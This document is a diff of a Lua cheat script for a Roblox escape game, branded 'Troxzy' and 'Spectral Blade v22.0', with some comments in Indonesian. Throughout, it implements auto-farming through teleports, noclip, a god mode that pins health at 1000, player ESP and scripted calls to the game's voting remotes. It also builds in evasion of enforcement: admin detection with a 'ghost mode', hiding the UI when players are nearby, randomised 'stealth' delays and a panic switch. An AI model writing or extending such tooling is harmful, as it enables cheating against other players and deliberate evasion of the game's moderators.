+                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
+                        task.wait(0.05)
+                        hum:ChangeState(Enum.HumanoidStateType.Running)
+                        task.wait(0.05)
+                    end
+                end
+            end
+            if FailedScan then RunService.Heartbeat:Wait() end
+        else
+            -- EXIT PHASE
+            applyNoclip(false)
+            currentHRP.Anchored = false
+            if Camera.CameraSubject ~= ExitRegion then Camera.CameraSubject = ExitRegion end
+            if not Escaped then
+                local TargetCFrame = GetRandomPoint(ExitRegion)
+                currentHRP.CFrame = TargetCFrame
+                currentHRP.Velocity = Vector3.zero
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+            else
+                Escaped = false
+                Camera.CameraSubject = hum
+                hum:ChangeState(Enum.HumanoidStateType.Dead)
+                notify("[SUCCESS] Escape Detected. Resetting...", "Success")
+                break
+            end
+        end
+    end
+
+    Camera.CameraSubject = hum
+    applyNoclip(false)
+    if GodMode then GodMode:Disconnect() end
+    CurrentlyFarming = false
+    updateStats(currentName)
+    rotateMap()
+    if CONFIG.SMART_ALERTS then playSound(SOUND_IDS.success) end
+    notify("[FINISH] Protocol Complete.", "Info")
+    clearESPCache()
+    Stats.currentMap = ""
+end
+
+function ConnectMapDetection()
+    DisconnectMapDetection()
+    MapDetect = Multiplayer.ChildAdded:Connect(function(NewMap)
+        NewMap:GetPropertyChangedSignal("Name"):Wait()
+        if getgenv().TomatoAutoFarm and not panicActive and not isGhostMode then
+            OnMapLoad(NewMap)
+            notify("[NET] Map Detected. Connecting...", "Info")
+        end
+    end)
+    TrackConnection(MapDetect)
+end
+
+-- ==================== AUTO QUEUE & LIFT ====================
 local function findLiftPosition()
     for _, obj in pairs(Workspace.Lobby:GetDescendants()) do
         if obj:IsA("BasePart") and obj.Name:lower():find("lift") then
@@ -479,7 +664,7 @@ local function findLiftPosition()
 end
 
 TrackConnection(RunService.Heartbeat:Connect(function()
-    if moveToLift and (AUTO_QUEUE_ENABLED or _G.TroxzyAutoFarm) and not panicActive and not TAS_RUNNING and not isGhostMode then
+    if moveToLift and (AUTO_QUEUE_ENABLED or getgenv().TomatoAutoFarm) and not panicActive and not TAS_RUNNING and not isGhostMode then
         local char = Player.Character
         local hum = char and char:FindFirstChild("Humanoid")
         local hrp = char and char:FindFirstChild("HumanoidRootPart")
@@ -487,17 +672,11 @@ TrackConnection(RunService.Heartbeat:Connect(function()
             if not Check("InGame") and not Check("InLift") then
                 if liftTarget then
                     local dir = (liftTarget - hrp.Position)
-                    if dir.Magnitude > 3 then
-                        hum:MoveTo(liftTarget)
-                        hum.WalkSpeed = 25
-                    else
-                        pcall(function() AddedWaiting:FireServer() end)
-                        moveToLift = false
-                    end
+                    if dir.Magnitude > 3 then hum:MoveTo(liftTarget); hum.WalkSpeed = 25
+                    else pcall(function() AddedWaiting:FireServer() end); moveToLift = false end
                 end
             elseif Check("InLift") then
-                pcall(function() AddedWaiting:FireServer() end)
-                moveToLift = false
+                pcall(function() AddedWaiting:FireServer() end); moveToLift = false
             end
         end
     end
@@ -513,7 +692,7 @@ local function StartAutoQueue()
         repeat task.wait() until Check("InGame")
         mapCompleted = false
         if not TAS_RUNNING then
-            _G.TroxzyAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection()
+            getgenv().TomatoAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection()
             task.spawn(ExecuteTAS)
         end
     end)
@@ -530,7 +709,7 @@ end
 
 task.spawn(function()
     while task.wait(0.5) do
-        if (AUTO_QUEUE_ENABLED or _G.TroxzyAutoFarm) and not panicActive and not isGhostMode then
+        if (AUTO_QUEUE_ENABLED or getgenv().TomatoAutoFarm) and not panicActive and not isGhostMode then
             local char = Player.Character
             if char and char:FindFirstChild("HumanoidRootPart") and not Check("InGame") and not Check("InLift") and not TAS_RUNNING and not CurrentlyFarming then
                 moveToLift = true; liftTarget = findLiftPosition()
@@ -544,210 +723,7 @@ TrackConnection(Player.CharacterAdded:Connect(function()
     refreshNoclip(); ncActive = false; if not Check("InGame") then mapCompleted = false end
 end))
 
--- ==================== NOCLIP, VISUALS, ESP ====================
-local ncCache, ncActive = {}, false
-local function refreshNoclip() ncCache = {}; local char = Player.Character; if char then for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then table.insert(ncCache, v) end end end end
-local function applyNoclip(state) if state == ncActive then return end; ncActive = state; for _, v in ipairs(ncCache) do if v and v.Parent then v.CanCollide = not state end end end
-refreshNoclip()
-
-local espCache, lastESPUpdate = {}, 0
-local ESP_MAX_DISTANCE = 100 -- Batas jarak render ESP
-local function updateESP()
-    if os.clock() - lastESPUpdate < 0.1 then return end; lastESPUpdate = os.clock()
-    if not CONFIG.ESP then
-        for _, hl in pairs(espCache) do pcall(function() hl:Destroy() end) end
-        espCache = {}; return
-    end
-    local myRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= Player then
-            if plr.Character and not espCache[plr] then
-                local distOk = not myRoot or (plr.Character:FindFirstChild("HumanoidRootPart") and (myRoot.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= ESP_MAX_DISTANCE)
-                if distOk then
-                    local hl = Instance.new("Highlight")
-                    hl.FillColor = Color3.fromRGB(160, 180, 200); hl.OutlineColor = Color3.fromRGB(255, 255, 255)
-                    hl.Parent = plr.Character; espCache[plr] = hl
-                end
-            elseif not plr.Character and espCache[plr] then
-                pcall(function() espCache[plr]:Destroy() end); espCache[plr] = nil
-            elseif plr.Character and espCache[plr] and myRoot and plr.Character:FindFirstChild("HumanoidRootPart") then
-                if (myRoot.Position - plr.Character.HumanoidRootPart.Position).Magnitude > ESP_MAX_DISTANCE then
-                    pcall(function() espCache[plr]:Destroy() end); espCache[plr] = nil
-                end
-            end
-        end
-    end
-    for plr, hl in pairs(espCache) do
-        if not plr.Parent or (plr.Character and hl.Parent ~= plr.Character) then
-            pcall(function() hl:Destroy() end); espCache[plr] = nil
-        end
-    end
-end
-local function clearESPCache() for _, hl in pairs(espCache) do pcall(function() hl:Destroy() end) end; espCache = {} end
-
--- ==================== PANIC MODE ====================
-local panicActive = false; _G.ToggleStates = {}
-local minimizeUI, maximizeUI
-local function activatePanicMode() 
-    panicActive = true; _G.TroxzyAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection(); StopAutoQueue(); applyNoclip(false)
-    pcall(function() Player.Character.Humanoid.WalkSpeed = 16 end); minimizeUI(true); clearESPCache()
-    if isGhostMode then deactivateGhostMode() end
-    notify("PANIC MODE ACTIVATED!", "Emergency")
-    if _G.ToggleStates["PANIC_MODE"] then _G.ToggleStates["PANIC_MODE"].SetState(true) end 
-end
-local function deactivatePanicMode() 
-    panicActive = false; _G.TroxzyAutoFarm = false; CurrentlyFarming = false; pcall(function() Player.Character.Humanoid.WalkSpeed = 16 end)
-    applyNoclip(false); maximizeUI(); if _G.ToggleStates["PANIC_MODE"] then _G.ToggleStates["PANIC_MODE"].SetState(false) end 
-end
-
-local lastVisUpdate, lastFOV = 0, 70
-local function updateVisuals() if os.clock() - lastVisUpdate < 0.5 then return end; lastVisUpdate = os.clock(); Lighting.Brightness = CONFIG.FULLBRIGHT and 2 or 1; Lighting.FogEnd = CONFIG.FULLBRIGHT and 99999 or 10000; if Camera then local tfov = CONFIG.FOV and CONFIG.FOV_VAL or 70; if tfov ~= lastFOV then Tween(Camera, {FieldOfView = tfov}); lastFOV = tfov end end; periodicFloodColorUpdate() end
-
--- ==================== MANUAL AUTO FARM LOGIC (dengan anti-stuck timer) ====================
-local function OnMapLoad(map)
-    clearESPCache()
-    local settings = map:WaitForChild("Settings", 10)
-    local mapName = settings and settings:GetAttribute("MapName") or "Unknown"
-    Stats.currentMap = mapName
-
-    handleAdminDetection() -- cek admin, jika ada langsung ghost mode
-
-    if isMapBlacklisted(mapName) then
-        Stats.blacklistedSkipped = Stats.blacklistedSkipped + 1
-        notify("Blacklisted: " .. mapName, "Skip"); saveStats()
-        local char = Player.Character
-        if char then
-            local hrp = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChild("Humanoid")
-            if hrp and hum then hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0 end
-        end
-        CurrentlyFarming = false; return
-    end
-
-    CurrentlyFarming, Escaped = true, false
-    local char = Player.Character; if not char then CurrentlyFarming = false; return end
-    local hrp = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChild("Humanoid")
-    if not hrp or not hum then CurrentlyFarming = false; return end
-
-    local currentRank, currentName = GetDifficulty()
-    if currentRank > (DIFFICULTY_RANKS[CONFIG.TARGET_DIFFICULTY] or 999) then
-        notify("Difficulty High! Reset...", "Error")
-        repeat task.wait() until not hrp.Anchored and hum.WalkSpeed >= 20
-        hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0
-        CurrentlyFarming = false; return
-    end
-
-    local buttons = {}
-    for _, obj in pairs(map:GetDescendants()) do
-        if isRandStr(obj.Name) and obj.ClassName == "Model" then
-            local hitbox
-            for _, c in pairs(obj:GetChildren()) do
-                if c:IsA("BasePart") and tostring(c.BrickColor) ~= "Medium stone grey" then hitbox = c; break end
-            end
-            if hitbox and isRandStr(hitbox.Name) then hitbox.Name = "Hitbox"; table.insert(buttons, obj) end
-        end
-    end
-
-    local lostPage, rescue = map:FindFirstChild("_LostPage", true), map:FindFirstChild("_Rescue", true)
-    local ocf = hrp.CFrame
-    if lostPage then hrp.CFrame = lostPage.CFrame; task.wait(); hrp.CFrame = ocf end
-    if rescue then hrp.CFrame = rescue.Contact.CFrame; task.wait(); hrp.CFrame = ocf end
-
-    local godMode = hum:GetPropertyChangedSignal("Health"):Connect(function() hum.Health = 1000 end)
-    TrackConnection(godMode)
-    applyNoclip(true)
-
-    -- Anti-stuck timer
-    local lastPosition = hrp.Position
-    local stuckTimer = 0
-
-    while RunService.Heartbeat:Wait() and Check("InGame") and _G.TroxzyAutoFarm and not panicActive and not isGhostMode do
-        if not CurrentlyFarming then break end
-
-        if CONFIG.HIDE_SCRIPT and Main then Main.Visible = not isPlayerNearby() end
-        if shouldTakeBreak() then task.wait(getRandomFarmDelay()) end
-
-        -- Cek stuck: jika posisi tidak berubah selama 15 detik, paksa reset
-        if (hrp.Position - lastPosition).Magnitude < 1 then
-            stuckTimer = stuckTimer + 1
-            if stuckTimer > 150 then -- ~15 detik (Heartbeat 0.1s)
-                notify("Stuck detected! Resetting character...", "Anti-Stuck")
-                hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0
-                break
-            end
-        else
-            stuckTimer = 0
-            lastPosition = hrp.Position
-        end
-
-        local exitRegion = map:FindFirstChild("ExitRegion", true)
-        local currentHRP = Player.Character:FindFirstChild("HumanoidRootPart")
-        if not currentHRP then break end
-        local failedScan = true
-
-        if not exitRegion then
-            if Camera.CameraSubject ~= hum then Camera.CameraSubject = hum end
-            currentHRP.Anchored = true
-            for _, button in pairs(buttons) do
-                if not _G.TroxzyAutoFarm then break end
-                local bh = button:FindFirstChild("Hitbox")
-                if bh and button:FindFirstChild("TouchInterest", true) and button:FindFirstChildWhichIsA("BillboardGui", true) then
-                    failedScan = false; currentHRP.Anchored = false
-                    currentHRP.CFrame = CFrame.new(bh.Position - stealthOffset())
-                    hum:ChangeState(Enum.HumanoidStateType.Jumping); task.wait(stealthDelay())
-                    hum:ChangeState(Enum.HumanoidStateType.Running); task.wait(stealthDelay())
-                end
-            end
-            if failedScan then RunService.Heartbeat:Wait() end
-        else
-            applyNoclip(false); currentHRP.Anchored = false
-            if Camera.CameraSubject ~= exitRegion then Camera.CameraSubject = exitRegion end
-            if not Escaped then
-                currentHRP.CFrame = GetRandomPoint(exitRegion); currentHRP.Velocity = Vector3.zero
-                hum:ChangeState(Enum.HumanoidStateType.Jumping)
-            else
-                Escaped = false; Camera.CameraSubject = hum
-                hum:ChangeState(Enum.HumanoidStateType.Dead); break
-            end
-        end
-    end
-
-    Camera.CameraSubject = hum; applyNoclip(false)
-    if godMode then godMode:Disconnect() end
-    CurrentlyFarming = false; updateStats(currentName); rotateMap()
-    if CONFIG.SMART_ALERTS then playSound(SOUND_IDS.success) end
-    notify("Complete!", "System")
-    clearESPCache(); Stats.currentMap = ""
-end
-
-function ConnectMapDetection()
-    DisconnectMapDetection()
-    MapDetect = Multiplayer.ChildAdded:Connect(function(newMap)
-        newMap:GetPropertyChangedSignal("Name"):Wait()
-        if _G.TroxzyAutoFarm and not panicActive and not isGhostMode then
-            OnMapLoad(newMap); notify("Map Detected!", "Info")
-        end
-    end)
-    TrackConnection(MapDetect)
-end
-
-TrackConnection(NewMapVote.OnClientEvent:Connect(function(data)
-    local maps = data.mapData; local pVotes = data.pVotes or {}
-    if not maps then return end
-    local targetMap; for _, m in pairs(maps) do if m.name == CONFIG.TARGET_MAP and m.displayMap then targetMap = m; break end end
-    if targetMap then
-        _G.TroxzyAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection()
-        local success, k = pcall(function() return ReqPasskey:InvokeServer() end)
-        local key = (success and type(k) == "number") and -k or nil
-        if key then
-            local prevVotes = (pVotes[tostring(Player.UserId)] and pVotes[tostring(Player.UserId)].voteCount) or 0
-            local cost = math.clamp(targetMap.extraVoteCost + (prevVotes - 1) * 10, 0, 50)
-            UpdMapVote:FireServer(key, targetMap.ID, cost)
-        end
-        task.wait(1); AddedWaiting:FireServer()
-    end
-end))
-
--- ==================== NEW PROFESSIONAL UI ====================
+-- ==================== PROFESSIONAL UI (V21.0) ====================
 local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = "TROXZY_VIP"; ScreenGui.ResetOnSpawn = false
 if not pcall(function() ScreenGui.Parent = CoreGui end) then ScreenGui.Parent = Player.PlayerGui end
 
@@ -776,7 +752,7 @@ RegisterThemeObject(PlayerName, "TextColor3", DARK_THEME.TextBright, LIGHT_THEME
 local Username = Instance.new("TextLabel"); Username.Size = UDim2.new(0,150,0,14); Username.Position = UDim2.new(0,65,0.5,4); Username.Text = "@" .. Player.Name; Username.TextColor3 = DARK_THEME.TextDim; Username.TextSize = 11; Username.Font = Enum.Font.Gotham; Username.BackgroundTransparency = 1; Username.TextXAlignment = Enum.TextXAlignment.Left; Username.Parent = Header
 RegisterThemeObject(Username, "TextColor3", DARK_THEME.TextDim, LIGHT_THEME.TextDim)
 
-local TitleLabel = Instance.new("TextLabel"); TitleLabel.Size = UDim2.new(0,120,0,20); TitleLabel.Position = UDim2.new(1,-134,0.5,-13); TitleLabel.Text = "GHOST PROTOCOL"; TitleLabel.TextColor3 = DARK_THEME.Accent; TitleLabel.TextSize = 13; TitleLabel.Font = Enum.Font.GothamBlack; TitleLabel.BackgroundTransparency = 1; TitleLabel.TextXAlignment = Enum.TextXAlignment.Right; TitleLabel.Parent = Header
+local TitleLabel = Instance.new("TextLabel"); TitleLabel.Size = UDim2.new(0,120,0,20); TitleLabel.Position = UDim2.new(1,-134,0.5,-13); TitleLabel.Text = "SPECTRAL BLADE"; TitleLabel.TextColor3 = DARK_THEME.Accent; TitleLabel.TextSize = 13; TitleLabel.Font = Enum.Font.GothamBlack; TitleLabel.BackgroundTransparency = 1; TitleLabel.TextXAlignment = Enum.TextXAlignment.Right; TitleLabel.Parent = Header
 RegisterThemeObject(TitleLabel, "TextColor3", DARK_THEME.Accent, LIGHT_THEME.Accent)
 
 local Divider = Instance.new("Frame"); Divider.Size = UDim2.new(1, -28, 0, 1); Divider.Position = UDim2.new(0, 14, 0, 60); Divider.BackgroundColor3 = DARK_THEME.Border; Divider.BackgroundTransparency = 0.9; Divider.BorderSizePixel = 0; Divider.Parent = Main
@@ -835,7 +811,9 @@ local function AddToggle(tabKey, name, stateKey) local tabIdx; for i, t in ipair
     btn.MouseButton1Click:Connect(function()
         state = not state; setToggleUI(state)
         if stateKey == "AUTO_QUEUE" then AUTO_QUEUE_ENABLED = state; if state then CONFIG.TAS_MODE = "Play"; CONFIG.TAS_AUTO_START = true; mapCompleted = false; if _G.ToggleStates["TAS_AUTO_START"] then _G.ToggleStates["TAS_AUTO_START"].SetState(true) end; StartAutoQueue() else StopAutoQueue() end
-        elseif stateKey == "AutoFarm" then _G.TroxzyAutoFarm = state; if state then ConnectMapDetection() else DisconnectMapDetection(); CurrentlyFarming = false end
+        elseif stateKey == "AutoFarm" then
+            getgenv().TomatoAutoFarm = state
+            if state then ConnectMapDetection() else DisconnectMapDetection(); CurrentlyFarming = false end
         elseif stateKey == "NIGHT_MODE" then applyTheme(state and "Light" or "Dark")
         elseif stateKey == "DASHBOARD" then CONFIG.DASHBOARD = state; if _G.DashboardUI then _G.DashboardUI.Visible = state end
         elseif stateKey == "PANIC_MODE" then if state then activatePanicMode() else deactivatePanicMode() end
@@ -898,11 +876,8 @@ local function updateDashboard()
     timeLabel.Text = "?? <b>Time:</b> " .. math.floor((os.clock() - Stats.sessionStart) / 60) .. "m"
     local sessionHours = (os.clock() - Stats.sessionStart) / 3600
     speedLabel.Text = "? <b>Rate:</b> " .. ((sessionHours > 0 and Stats.mapsCompleted > 0) and math.floor(Stats.mapsCompleted / sessionHours) or 0) .. " maps/hr"
-    if isGhostMode then
-        ghostStatusLabel.Text = "?? <b>Ghost Mode:</b> ACTIVE"; ghostStatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-    else
-        ghostStatusLabel.Text = "?? <b>Ghost Mode:</b> Inactive"; ghostStatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-    end
+    if isGhostMode then ghostStatusLabel.Text = "?? <b>Ghost Mode:</b> ACTIVE"; ghostStatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+    else ghostStatusLabel.Text = "?? <b>Ghost Mode:</b> Inactive"; ghostStatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180) end
     if panicActive then statusLabel.Text = "? <b>Status:</b> PANIC"; statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
     elseif TAS_RUNNING then statusLabel.Text = "? <b>Status:</b> TAS PLAYING"; statusLabel.TextColor3 = Color3.fromRGB(0,230,120)
     elseif AUTO_QUEUE_ENABLED then statusLabel.Text = "? <b>Status:</b> Auto Queue"; statusLabel.TextColor3 = Color3.fromRGB(100,200,255)
@@ -924,7 +899,7 @@ AddButton("TAS", "Record Route", DARK_THEME.ButtonRecord, function() if not CONF
 AddButton("TAS", "Force Play Route", DARK_THEME.Accent, function() if not CONFIG.TAS_AUTO_START then notify("Enable Auto-Start"); return end; CONFIG.TAS_MODE="Play"; task.spawn(ExecuteTAS) end)
 TAS_STATUS_LABEL = AddInfoLabel("TAS", "Status: ▶ READY")
 
-AddSection("Farm", "CORE (MANUAL)")
+AddSection("Farm", "CORE (Tomatotxt Engine)")
 AddToggle("Farm", "Enable Auto Farm", "AutoFarm")
 AddInfoLabel("Farm", "Target: " .. CONFIG.TARGET_MAP)
 
@@ -1000,5 +975,5 @@ TrackConnection(UIS.JumpRequest:Connect(function() if CONFIG.INF_JUMP and Player
 
 loadStats()
 setupAutoReconnect()
-notify("GHOST PROTOCOL v21.0 - Deployed", "System")
-print("TROXZY: Ghost Protocol v21.0 fully operational.")
+notify("SPECTRAL BLADE v22.0 - Tomatotxt Engine Online", "System")
+print("TROXZY: Spectral Blade v22.0 fully operational.")
